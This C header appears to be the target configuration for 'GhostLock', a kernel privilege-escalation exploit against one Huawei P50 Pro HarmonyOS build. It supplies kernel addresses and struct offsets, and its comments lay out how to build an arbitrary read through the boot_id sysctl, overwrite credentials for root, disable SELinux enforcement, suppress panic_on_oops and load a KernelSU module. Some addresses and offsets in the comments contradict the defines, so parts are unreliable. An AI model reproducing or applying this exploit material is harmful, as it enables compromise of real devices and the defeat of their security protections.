/* KERNEL: A528BXXSBGYI3 5.4.254-qgki-28575149-abA528BXXSBGYI3 */
/* GhostLock (CVE-2026-43499) target for HUAWEI JAD-AL00 (P50 Pro),
 * HarmonyOS 4.2.0.211 (C00E182R4P7), kernel 5.4.86-qgki-g89b2dfc9cd7e-dirty
 * (Android clang 11.0.2 r383902b, built Mon Sep 21 18:47:00 CST 2026).
 * Every address below was taken from the shipped arm64 Image's kallsyms
 * (work/hm42/syms_hm42.txt, 225,175 symbols, extracted with vmlinux-to-elf
 * from boot.img of the 104.2.0.211 base package).
 * Struct offsets: task->comm 0x7d0 was confirmed in init_task's bytes
 * ("swapper"), struct module.init 0x178 from do_init_module's [x19,#0x178].
 * No 4.2 kernel source is available, so everything below is image-derived.
 */
#ifndef TARGET_H
#define TARGET_H

/* target profile */
#define KIMAGE_TEXT_BASE 0xffffffc010080000ULL      /* link-time _text */
#define KIMAGE_STEXT_LINK 0xffffffc010081000ULL     /* link-time _stext */

/* KASLR anchors (kimage VAs; runtime = image + kaslr_slide) */
#define SLIDE_LOGGERS_0_1_IMAGE 0xffffffc012c33958ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE 0xffffffc01315edf9ULL
#define SLIDE_INIT_TASK_IMAGE 0xffffffc012d24480ULL

/* Read primitive: boot_id's ctl_table entry inside random_table[].
 * random_table @0xffffffc01349ab10, stride 0x40, order per
 * drivers/char/random.c: poolsize, entropy_avail, write_wakeup_threshold,
 * urandom_min_reseed_secs, boot_id (idx 4), uuid (idx 5), ...
 * (checked in the image with work/ctltab_scan.py: idx 4/5 have maxlen 16 and
 * mode 0444, procname pointers are unrelocated zeroes in the file, so the
 * layout is identified by maxlen/mode.)
 *   entry 0xffffffc01349ac10: +0x00 procname = "boot_id",
 *                             +0x08 data     = &sysctl_bootid (0x...694b24)
 *   (struct ctl_table 5.4: procname 0x00, data 0x08, maxlen 0x10, mode 0x14,
 *    child 0x18, proc_handler 0x20, poll 0x28, extra1 0x30, extra2 0x38)
 * Point .data at any address A (pointer-value write) and reading
 * /proc/sys/kernel/random/boot_id returns 16 bytes at A.
 */
#define SLIDE_BOOTID_CTL_ENTRY_IMAGE 0xffffffc012d94508ULL
#define SLIDE_BOOTID_CTL_DF_IMAGE 0xffffffc012d94510ULL

/* Next random_table[] entry is /proc/sys/kernel/random/uuid (data starts NULL,
 * proc_do_uuid() generates when NULL) -> scratch read gateway. */
#define SLIDE_UUID_CTL_ENTRY_IMAGE 0xffffffc012d94548ULL
#define SLIDE_UUID_CTL_DF_IMAGE 0xffffffc012d94550ULL
/* Arbitrary-read client.  proc_do_uuid() does
 *     if (!uuid[8]) generate_random_uuid(uuid);
 * before formatting, i.e. it WRITES 16 random bytes over the target whenever
 * the byte at addr+8 is zero, so reads must go through the boot_id entry
 * (whose proc handler never writes into the data buffer).  Pointing boot_id
 * at A and reading the file returns A's 16 bytes. */
#define SLIDE_READ_CTL_DF_IMAGE SLIDE_BOOTID_CTL_DF_IMAGE
#define SLIDE_READ_CTL_DF_RESTORE SLIDE_RANDOM_BOOT_ID_DATA_IMAGE

/* Fake rt_mutex slots: the linker padding inside the selinux_state page.
   selinux_state lives at 0xffffffc013628000 and empty_zero_page (a 4 KB,
   page-aligned object) starts at 0xffffffc013629000, so every byte from
   selinux_state+sizeof() up to 0x...629000 belongs to .bss but to no symbol
   (syms_hm42.txt lists selinux_state and empty_zero_page as the only symbols
   in that page): nothing reads or writes it.  The old value (inside
   empty_zero_page) made every walk leave two kernel stack pointers in the
   zero page, which every process observes through untouched anonymous
   mappings and destabilises the device.  One fresh 0x20-byte slot per walk
   (the walk leaves waiters.rb_root/rb_leftmost pointing at this attempt's
   waiter).  The last 0x100 bytes of the page (0x...8f00..0x...9000) are
   reserved for the two word-sized POINTER *values*
   (SLIDE_KSU_CAP_VALUE_IMAGE and SLIDE_SEC_ZERO_BLOB_IMAGE), because the
   rb_erase secondary store writes `target` at value+8. */
#define GOT_FAKE_LOCK_BSS_IMAGE 0xffffffc012f0dc00ULL
#define SLIDE_LOCK_STRIDE 0x20ULL
#define SLIDE_LOCK_SLOTS 24

/* rt_mutex_waiter fields (5.4.86 + CONFIG_HW_FUTEX_PI, 88 bytes):
   tree@0x00, pi_tree@0x18, task@0x30, lock@0x38, major_prio@0x40,
   major_only@0x44, prio@0x48, deadline@0x50 */
#define WAITER_TREE_ENTRY_OFF 0x0
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38

/* Endgame anchors:
 *   init_cred 0xffffffc01341e630: usage>0, uid/gid=0
 *   task_struct (4.2: layout identical to 4.0): real_cred@0x7b8, cred@0x7c0,
 *   comm@0x7d0 (real_cred@0x7b8 cred@0x7c0 cached_requested_key@0x7c8), thread_pid@0x668
 *   __schedule 0xffffffc011b9d678: `mrs x27, sp_el0` at +0x34, x27 is never
 *   rewritten until `ldp x28, x27, [sp, #0x30]` at +0x820
 *   -> perf REGS_INTR slot 27 = current task
 */
#define SLIDE_INIT_CRED_IMAGE 0xffffffc012687c78ULL
#define SLIDE_SCHEDULE_IMAGE 0xffffffc01179ad40ULL
#define SLIDE_SCHEDULE_WIN_START 0x0
#define SLIDE_SCHEDULE_WIN_END 0x1000
#define SLIDE_DO_FUTEX_IMAGE 0xffffffc0103e473cULL
#define SLIDE_SYS_FUTEX_IMAGE 0xffffffc0103e8010ULL
#define SLIDE_TASK_REAL_CRED_OFF 0x808
#define SLIDE_TASK_CRED_OFF 0x800
#define SLIDE_TASK_COMM_OFF 0x818

/* 4.2 percpu: rq = pcpu_base_addr + (runqueues - __per_cpu_start);
   __schedule does `ldr x19,[x20,#0x8d8]` for prev and `str x22,[x20,#0x8d8]`
   for next, so rq->curr lives at +0x8d8. */
#define SLIDE_PCPU_BASE_ADDR_IMAGE 0xffffffc0125c9940ULL
#define SLIDE_PER_CPU_OFFSET_IMAGE 0xffffffc012c30138ULL
#define SLIDE_RQ_PCPU_OFF 0x18480ULL
#define SLIDE_RUNQUEUES_IMAGE 0xffffffc0129075c0ULL
#define SLIDE_RQ_CURR_OFF 0x8d8
#define SLIDE_CRED_UID_OFF 0x04

/* Risk reduction: leaf-zero panic_on_oops before playing. */
#define SLIDE_PANIC_ON_OOPS_IMAGE 0xffffffc012d2a3a8ULL

/* Debugging aid (--open-dmesg): sysctl_dmesg_restrict and sysctl_kptr_restrict
 * are ints; a leaf zero write makes the kernel ring buffer and /proc/kallsyms
 * readable from a plain shell.  Needed because plat_sepolicy grants no
 * capability syslog to the shell domain, so uid 0 alone is not enough to read
 * dmesg. */
#define SLIDE_DMESG_RESTRICT_IMAGE 0x0ULL
#define SLIDE_KPTR_RESTRICT_IMAGE 0x0ULL
#define SLIDE_SIG_ENFORCE_IMAGE 0x0ULL
#define SLIDE_MODULES_DISABLED_IMAGE 0xffffffc01302be3cULL

/* SELinux relax: selinux_state @0xffffffc013628000 (.bss); CONFIG_
 * SECURITY_SELINUX_DEVELOP is off, so layout is {disabled@0, checkreqprot@1,
 * initialized@2, capability[6]@3, android_netlink_*@9/0xa, avc@0x10, ss@0x18};
 * security_compute_av() returns allowed=0xffffffff when initialized==0.
 * AVC threshold: struct selinux_avc starts with avc_cache_threshold (u32)
 * @selinux_avc = 0xffffffc01367f060. */
#define SLIDE_SELINUX_STATE_INITIALIZED_IMAGE 0xffffffc012f0d003ULL
/* Fake task_security_struct: a fresh, never-used 8-byte zero in the padding
 * page above (NOT empty_zero_page: its +8 rb_erase side effect would poison a
 * page every process maps read-only for untouched anonymous memory, which
 * corrupts userspace heaps and kills system_server/apps). */
#define SLIDE_SEC_ZERO_BLOB_IMAGE 0xffffffc012f0df20ULL
#define SLIDE_AVC_CACHE_THRESHOLD_IMAGE 0xffffffc0130c7410ULL

/* --- module loading (--ksu) ---------------------------------------------
 * SLIDE_KSU_CAP_VALUE_IMAGE is a writable .bss address used as the *value*
 * written into cred->cap_effective: its low 32 bits must contain CAP_SYS_MODULE
 * (bit 16) and value+8 must be writable, because the rb_erase secondary store
 * writes `target` there.  It lives in the same symbol-free padding page as the
 * fake-lock slots (0x...7f00, +8 = 0x...8f08 unused).
 * KASLR slides are 2 MB aligned, so the low 21 bits (hence bit 16) survive
 * canon_addr().  Bit 1 is CAP_DAC_OVERRIDE: it is what lets the module's
 * ksu_cred (prepare_creds() of our task, so it inherits this word) open the
 * root-only /data/adb/ksu/.allowlist even though only cred->uid was zeroed and
 * cred->fsuid is still 2000 - without it the module logs
 * "load_allow_list open file failed: -13". */
#define SLIDE_KSU_CAP_VALUE_IMAGE 0xffffffc012f0df02ULL
#define SLIDE_CRED_SECURITY_OFF 0x78ULL /* struct task_security_struct * */
#define SLIDE_CRED_CAP_EFFECTIVE_OFF 0x38ULL
#define SLIDE_CRED_CAP_PERMITTED_OFF 0x30ULL

#endif
